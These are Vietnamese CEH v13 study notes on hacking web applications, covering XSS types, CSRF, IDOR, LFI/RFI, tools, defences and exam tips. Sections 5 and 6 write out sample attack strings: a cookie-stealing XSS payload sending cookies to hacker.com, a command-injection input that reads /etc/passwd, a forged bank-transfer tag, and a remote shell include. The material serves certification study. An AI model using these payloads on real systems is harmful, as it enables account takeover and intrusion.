# 📚 CEH v13 Study Notes - Module 14: Hacking Web Applications

> **[📝 LỜI KHUYÊN TỪ GIẢNG VIÊN - ĐỌC KỸ TRƯỚC KHI BẮT ĐẦU]**
> *   "Hãy nhớ nguyên tắc lõi: **AI is an overlay, not a replacement.** Trong phiên bản v13, AI được dùng cực nhiều để cào (crawl) và phân tích hàng vạn file mã nguồn nhằm tìm kiếm lỗ hổng logic hoặc IDOR. Nhưng nếu bạn không hiểu bản chất của **OWASP Top 10** (XSS, CSRF, Injection), AI sẽ chỉ báo cáo rác (False Positive)."
> *   "Hãy **tự vẽ tay sơ đồ mindmap** phân loại 3 loại XSS: Reflected, Stored, và DOM-based. Đề thi sẽ liên tục bắt bạn phải phân biệt 3 loại này qua các tình huống thực tế."

---

## 1. Module Overview (Dạy điều gì? Tại sao quan trọng?)
*   **Dạy điều gì:** Khai thác các lỗ hổng sinh ra từ *lỗi lập trình* (Poor Coding) của Developer. Tập trung vào cách thao túng dữ liệu đầu vào (Input) để đánh lừa ứng dụng Web thực thi mã độc, đọc file nhạy cảm, hoặc cướp quyền người dùng. Bám sát danh sách **OWASP Top 10**.
*   **Tại sao quan trọng:** Hiện nay Firewall đã chặn hầu hết các cổng mạng (trừ Port 80/443). Do đó, con đường duy nhất và dễ dàng nhất để hack vào hệ thống là thông qua chính giao diện Web. Lỗi Web App chiếm tới hơn 70% các vụ rò rỉ dữ liệu (Data Breach) trên toàn cầu.

## 2. Core Concepts (Definition, Meaning, Why it matters)
*   **OWASP (Open Web Application Security Project):** Tổ chức phi lợi nhuận toàn cầu chuyên đưa ra các tiêu chuẩn và tài liệu bảo mật Web. (Top 10 OWASP là "Kinh thánh" của Pentester).
*   **Injection (Tiêm nhiễm):** Kẻ tấn công chèn các lệnh hệ thống (OS Command, SQL) vào các ô nhập liệu (Input field) mà Developer không lọc ký tự (Sanitize input), khiến Web hiểu nhầm đó là lệnh hợp lệ và thực thi.
*   **XSS (Cross-Site Scripting):** Tiêm mã JavaScript vào Website để nó chạy trên trình duyệt của nạn nhân. Mục đích chính là cướp Session Cookie (Cướp tài khoản).
*   **CSRF (Cross-Site Request Forgery):** Ép trình duyệt của nạn nhân (đang có Session hợp lệ) gửi một yêu cầu độc hại (VD: Chuyển tiền) mà nạn nhân không hề hay biết.
*   **IDOR (Insecure Direct Object References):** Lỗi logic phân quyền. Lập trình viên ẩn các ID đối tượng trên URL (VD: `id=101`), hacker đổi ID thành `102` là xem được dữ liệu của người khác mà không bị chặn.

## 3. KEYWORDS 
| Mức độ | Từ khóa | Ý nghĩa cốt lõi |
| :--- | :--- | :--- |
| 🔴 **MUST MEMORIZE** | **OWASP Top 10** | Danh sách 10 lỗ hổng Web nghiêm trọng nhất. |
| 🔴 **MUST MEMORIZE** | **Stored XSS** | Lỗ hổng XSS lưu trữ. Mã độc được lưu hẳn vào Database của trang Web (VD: Comment). Bất kỳ ai vào xem comment đều bị dính mã độc. (Nguy hiểm nhất). |
| 🔴 **MUST MEMORIZE** | **Reflected XSS** | Lỗ hổng XSS phản xạ. Mã độc nằm ngay trên đường link URL. Hacker phải lừa nạn nhân bấm vào link mới chạy được. |
| 🟠 **HIGH PRIORITY** | **CSRF** | Lừa trình duyệt tự động gửi Request thay cho người dùng. (Chống lại bằng Anti-CSRF Token). |
| 🟠 **HIGH PRIORITY** | **SSRF** | Server-Side Request Forgery. Ép Web Server tự gửi truy vấn thay cho Hacker (Dùng để quét mạng nội bộ). |
| 🟡 **SHOULD KNOW** | **LFI / RFI** | Local/Remote File Inclusion. Lỗi nhúng file, cho phép Hacker thực thi mã PHP từ xa. |

## 4. TOOLS (Tool, Purpose, Used for, Important point)
| Tool Name | Phân loại | Mục đích & Ứng dụng | Điểm lưu ý quan trọng (Exam) |
| :--- | :--- | :--- | :--- |
| **Burp Suite** | Web Proxy | Proxy "đứng giữa" Trình duyệt và Máy chủ để chặn, sửa đổi gói tin HTTP (Intercept). Công cụ đỉnh cao nhất của Web Pentest. | Bắt buộc sử dụng. |
| **OWASP ZAP** | Web Proxy/Scanner | Công cụ miễn phí của OWASP, tính năng tương tự Burp Suite (Quét tự động Spidering). | Thay thế cho Burp Pro. |
| **Acunetix / Netsparker** | Web Vulnerability Scanner | Các phần mềm thương mại quét lỗ hổng Web cực kỳ mạnh mẽ và toàn diện (DAST). | Giá đắt, dùng cho doanh nghiệp. |
| **BeEF** | XSS Exploitation | (Browser Exploitation Framework). Khi nạn nhân dính XSS, trình duyệt sẽ bị BeEF "bắt làm con tin", cho phép Hacker điều khiển trình duyệt từ xa. | "Vũ khí" sau khi tiêm XSS. |
| **AI Web Fuzzers** | **AI-Powered** | Kẻ tấn công dùng AI để sinh ra các Payload đột biến (Mutation) thông minh nhằm lách qua Web Application Firewall (WAF) khi tìm XSS/SQLi. | Tính năng AI tự động hóa cao. |

## 5. COMMANDS (Command, Purpose, Important options)
> [!NOTE]
> Web App Hacking không dùng lệnh Console, mà dùng các chuỗi Payload để tiêm (Inject).

*   **XSS Payloads:**
    *   `<script>alert(1)</script>`: Lệnh test kinh điển xem Web có dính XSS không (Hiển thị popup số 1).
    *   `<script>new Image().src="http://hacker.com/cookie?c="+document.cookie;</script>`: Lệnh ăn trộm Cookie kinh điển.
*   **Command Injection (Tiêm lệnh OS):**
    *   Nhập vào ô Ping IP: `127.0.0.1; cat /etc/passwd`. Dấu chấm phẩy `;` báo cho Linux biết đây là 2 lệnh tách biệt, lệnh sau sẽ đọc tệp người dùng.

## 6. ATTACKS & TECHNIQUES
### Phân biệt 3 loại XSS (Cực kỳ quan trọng để thi):
1.  **Reflected XSS (Phản xạ - Non-persistent):** Mã độc nằm trong tham số URL (VD: `search.php?q=<script>...`). Nó không được lưu vào Database. Hacker phải gửi link này qua Chat/Email cho nạn nhân. Nạn nhân bấm vào, Web sẽ "phản xạ" mã độc lại trình duyệt.
2.  **Stored XSS (Lưu trữ - Persistent):** Hacker đăng 1 bài viết (hoặc Comment) chứa `<script>...` lên diễn đàn. Bài viết được lưu vào Database. Bất kỳ người nào (cả Admin) mở bài viết đó ra xem đều bị trộm Cookie. Nguy hiểm hơn Reflected cực nhiều vì không cần lừa ai bấm link.
3.  **DOM-based XSS:** Xảy ra hoàn toàn ở phía máy khách (Client-side / Trình duyệt). Mã độc không hề bay về Server, mà lợi dụng lỗi của thư viện JavaScript (DOM environment) để thực thi.

### Các kỹ thuật khác:
*   **CSRF (Cross-Site Request Forgery):** Nạn nhân đã đăng nhập vào `bank.com`. Hacker lừa nạn nhân vào trang `hacker.com`. Trang này có đoạn mã ngầm: `<img src="http://bank.com/transfer?to=Hacker&amount=1000">`. Trình duyệt nạn nhân tự động tải ảnh, vô tình gửi lệnh chuyển tiền kèm theo Cookie hợp lệ.
*   **IDOR (Insecure Direct Object Reference):** Đăng nhập vào trang tài khoản cá nhân, thấy URL là `profile.php?user_id=50`. Đổi thành `51` thì xem được tài khoản người khác. Lỗi do Web không kiểm tra quyền truy cập đối tượng.
*   **LFI / RFI (File Inclusion):** Lỗi do dùng hàm `include(tham_so)`. LFI (Local) cho phép đọc file trên máy chủ. RFI (Remote) cho phép Hacker nhúng mã độc từ một link ngoài (VD: `http://hacker.com/shell.txt`) vào thẳng máy chủ đích để lấy Remote Code Execution (RCE).

## 7. PROTOCOLS/PORTS/SERVICES
*   **WAF (Web Application Firewall):** Hoạt động ở Lớp 7 (Application). Ngăn chặn XSS, SQLi. Giải pháp phòng thủ bắt buộc cho mọi Web App.

## 8. IMPORTANT NUMBERS & FACTS
*   **Cơ chế bảo vệ CSRF:** Giải pháp duy nhất là Website phải sinh ra một **Anti-CSRF Token** (một chuỗi ngẫu nhiên ẩn trong Form HTML) mỗi khi người dùng gửi yêu cầu. Hacker không thể đoán được Token này nên yêu cầu sẽ bị từ chối.
*   **Cơ chế bảo vệ XSS:** Nguyên tắc cốt lõi là **Input Validation** (Kiểm tra đầu vào) và **Output Encoding / Sanitization** (Mã hóa đầu ra - biến ký tự `<` thành `&lt;`).

## 9. COMPARE & DIFFERENTIATE
| Tiêu chí | XSS (Cross-Site Scripting) | CSRF (Cross-Site Request Forgery) |
| :--- | :--- | :--- |
| **Bản chất** | Tấn công vào sự tin tưởng của **Người Dùng đối với Website**. | Tấn công vào sự tin tưởng của **Website đối với Người Dùng**. |
| **Mục đích** | Ăn trộm Cookie, điều khiển giao diện (Client-side). | Ép nạn nhân thực hiện 1 thao tác (Server-side) như chuyển tiền, đổi pass. |
| **Cách chống** | Output Encoding (Mã hóa đầu ra), Input Validation. | Anti-CSRF Tokens. |

| Tiêu chí | Directory Traversal (Mod 13) | LFI (Local File Inclusion - Mod 14) |
| :--- | :--- | :--- |
| **Bản chất** | Chỉ **Đọc** file nội dung chữ (Read). | Có khả năng **Thực thi** file (Execute) nếu file đó là mã nguồn (.php). |

## 10. CEH EXAM FOCUS (Format ôn thi tốt)
*   **Phân biệt XSS:**
    *   Đề bài: *"Mã độc JavaScript được đưa vào thanh URL và không lưu trên máy chủ"* -> Chọn **Reflected XSS**.
    *   Đề bài: *"Hacker post một comment chứa mã độc, khiến mọi người dùng xem comment đều bị ảnh hưởng"* -> Chọn **Stored / Persistent XSS**.
*   **Phân biệt CSRF:** Đề bài mô tả *"Hacker đánh lừa nạn nhân nhấp vào liên kết khiến trình duyệt tự động gửi yêu cầu đổi email trên trang ngân hàng mà nạn nhân đã đăng nhập"* -> Chọn **CSRF**.
*   **Công cụ Proxy:** Đề hỏi *"Công cụ nào đứng giữa (Proxy) giúp Hacker chặn (Intercept) và chỉnh sửa thông số POST trước khi gửi tới máy chủ Web?"* -> Chọn **Burp Suite**.
*   **IDOR:** Hỏi: *"Đổi URL từ `invoice=123` sang `invoice=124` để xem hóa đơn của người khác là lỗ hổng gì?"* -> Chọn **Insecure Direct Object Reference (IDOR)**.

## 11. COMMON CONFUSIONS
*   **Command Injection vs SQL Injection:** Command Injection là chèn lệnh của **Hệ Điều Hành** (như `ls`, `cat`, `ipconfig`) vào Web. SQL Injection là chèn lệnh của **Cơ Sở Dữ Liệu** (như `SELECT`, `DROP`).
*   **SSRF vs CSRF:**
    *   *CSRF:* Ép **Trình duyệt (Client)** gửi request.
    *   *SSRF:* Ép **Máy chủ Web (Server)** gửi request vào mạng nội bộ (Lan) của công ty.

## 12. REAL-WORLD CONTEXT
*   **Bug Bounty (Săn lỗi nhận thưởng):** Lỗ hổng IDOR là một trong những lỗi dễ tìm nhất và mang lại nhiều tiền nhất cho các thợ săn lỗi (Bug Bounty Hunters). Nhiều website lớn (ngay cả Facebook, Uber) cũng từng bị lỗi IDOR ở các chức năng API mới cập nhật.
*   **Blind XSS:** Trong thực tế có 1 loại Stored XSS cực kỳ nguy hiểm. Hacker chèn mã XSS vào ô "Góp ý cho Admin". Trang Web không hiện mã độc ra ngoài, nhưng khi Quản trị viên (Admin) đăng nhập vào trang Quản lý (Backend) để đọc góp ý, mã độc kích hoạt và ăn cắp luôn Cookie của Admin -> Hacker cướp toàn bộ hệ thống. (Tool để test: XSS Hunter).

## 13. QUICK REVISION
1.  **Lỗ hổng nào chèn mã JavaScript vào Website để ăn cắp Cookie?** -> XSS (Cross-Site Scripting).
2.  **Lỗ hổng XSS nào nguy hiểm nhất vì mã độc được lưu vĩnh viễn trên máy chủ?** -> Stored XSS.
3.  **Tấn công ép trình duyệt nạn nhân tự động thực hiện hành động trái phép (vd: chuyển tiền) gọi là gì?** -> CSRF.
4.  **Giải pháp phòng thủ hiệu quả nhất chống lại CSRF là gì?** -> Sử dụng Anti-CSRF Token.
5.  **Công cụ Proxy phổ biến nhất dùng để đánh chặn và sửa đổi gói tin Web (HTTP) là gì?** -> Burp Suite.
6.  **Lỗi đổi ID trên URL (vd `user=1` thành `user=2`) để xem trộm dữ liệu gọi là gì?** -> IDOR (Insecure Direct Object Reference).

## 14. MEMORY HOOKS
*   **OWASP:** **O**pen **W**eb **A**pplication **S**ecurity **P**roject (Cẩm nang sống còn của Web).
*   **XSS = Ăn cắp:** XSS giống như ăn trộm chìa khóa (Cookie).
*   **CSRF = Sai vặt:** CSRF giống như Hacker cầm tay bạn ép bạn ký tên vào tờ giấy vay nợ (Trình duyệt tự làm).
*   **Stored XSS:** Đặt quả mìn nổ chậm dưới ghế. Ai ngồi vào cũng chết.
*   **Reflected XSS:** Ném quả bóng vào tường văng lại mặt nạn nhân (Phải tự ném mới bị).
